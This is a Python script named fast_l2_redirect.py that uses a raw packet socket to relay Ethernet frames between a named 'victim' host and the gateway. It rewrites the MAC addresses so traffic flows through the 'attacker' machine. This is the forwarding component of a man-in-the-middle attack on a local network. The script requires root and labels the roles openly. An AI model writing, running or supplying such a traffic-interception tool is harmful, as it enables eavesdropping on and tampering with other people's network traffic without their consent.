#!/usr/bin/env python3
# fast_l2_redirect.py
import os, sys, socket
settings = {}


with open("puller.settings", "r") as f:
    for line in f.readlines():
        settings_name, setting = line.split(" ")
        settings[settings_name.strip()] = setting.strip()

if settings["mobile"] == "yes":
    from fcntl import ioctl

import struct


ETH_P_ALL = 0x0003
SIOCGIFHWADDR = 0x8927
SIOCGIFINDEX  = 0x8933

def if_hwaddr(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = ioctl(s.fileno(), SIOCGIFHWADDR, struct.pack('256s', ifname[:15].encode()))
    return info[18:24]

def if_index(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ifreq = struct.pack('256s', ifname[:15].encode())
    res = ioctl(s.fileno(), SIOCGIFINDEX, ifreq)
    return struct.unpack('i', res[16:20])[0]

def resolve_mac_ip(iface, ip):
    # quick arp resolution using a temporary raw socket sending ARP request (requires root)
    # This is a minimal method; you can also call `arp -n` externally.
    import subprocess
    out = subprocess.check_output(["ip", "neigh", "show", "to", ip]).decode(errors='ignore')
    # expected: "192.168.1.1 lladdr aa:bb:cc:dd:ee:ff REACHABLE dev wlan0"
    for part in out.split():
        if ':' in part and len(part.split(':'))==6:
            return bytes(int(b,16) for b in part.split(':'))
    return None

def mac_str_to_bytes(mac):
    return bytes(int(x,16) for x in mac.split(':'))

def main(IFACE, VICTIM, GATEWAY):
    if os.geteuid() != 0:
        print("run as root")
        sys.exit(1)

    victim_mac = resolve_mac_ip(IFACE, VICTIM)
    gateway_mac = resolve_mac_ip(IFACE, GATEWAY)
    if not victim_mac or not gateway_mac:
        print("couldn't resolve macs")
        sys.exit(1)

    attacker_mac = if_hwaddr(IFACE)
    ifindex = if_index(IFACE)

    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4 * 1024 * 1024)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
    s.bind((IFACE, 0))

    # pre-allocated buffer for recvfrom_into
    MAX_FRAME = 65536
    buf = bytearray(MAX_FRAME)

    v_mac = victim_mac
    g_mac = gateway_mac
    a_mac = attacker_mac

    print("attacker mac:", ':'.join(f"{b:02x}" for b in a_mac))
    print("victim mac:", ':'.join(f"{b:02x}" for b in v_mac))
    print("gateway mac:", ':'.join(f"{b:02x}" for b in g_mac))
    print("starting loop...")

    try:
        while True:
            # recv into buffer (zero allocation)
            nbytes, ancdata, flags, addr = s.recvmsg_into([buf], 0)
            if nbytes <= 14:  # too small for Ethernet
                continue
            frame = memoryview(buf)[:nbytes]

            src = bytes(frame[6:12])
            # ignore frames we injected
            if src == a_mac:
                continue
            try:
                if src == v_mac:
                    # rewrite dst/src in-place and send
                    new_frame = bytearray(frame)  # we need a mutable copy to send; small allocation unavoidable
                    new_frame[0:6] = g_mac
                    new_frame[6:12] = a_mac
                    # send raw
                    s.send(new_frame)
                elif src == g_mac:
                    new_frame = bytearray(frame)
                    new_frame[0:6] = v_mac
                    new_frame[6:12] = a_mac
                    s.send(new_frame)
                else:
                    continue
            except Exception as e:
                print(e)

    except KeyboardInterrupt:
        pass

